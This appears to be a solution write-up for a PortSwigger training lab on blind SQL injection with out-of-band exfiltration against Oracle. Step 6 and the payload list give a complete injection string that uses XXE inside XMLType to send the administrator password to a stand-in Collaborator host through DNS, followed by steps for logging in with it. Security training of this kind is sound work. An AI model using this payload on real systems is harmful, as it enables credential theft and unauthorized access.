## Blind SQL injection with out-of-band data exfiltration

**Category:** sqli
**Difficulty:** Expert

### Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The SQL query is executed asynchronously and has no effect on the application's response.

### Solution Steps
1. Identify the injection point in the TrackingId cookie
2. Normal blind techniques won't work - no visible response difference
3. Use out-of-band (OOB) data exfiltration via DNS lookups
4. This lab uses Oracle - use XXE within XMLType to make DNS requests
5. Craft payload that embeds query results in DNS lookup subdomain
6. Payload: `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`
7. Replace BURP-COLLABORATOR-SUBDOMAIN with your Collaborator server
8. When the query executes, it makes a DNS lookup to: <password>.your-server.com
9. Check Collaborator for incoming DNS lookups
10. The subdomain of the DNS request contains the administrator password
11. Extract the password from the DNS lookup and login

### Key Payloads
- `users`
- `username`
- `password`
- `administrator`
- `TrackingId`
- `EXTRACTVALUE(xmltype(...))`
- `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--`

### Indicators of Success
- No visible response change in application
- DNS lookup received at Collaborator server
- Subdomain contains exfiltrated data (password)
- Password extracted enables administrator login

---
*Source: PortSwigger Web Security Academy*
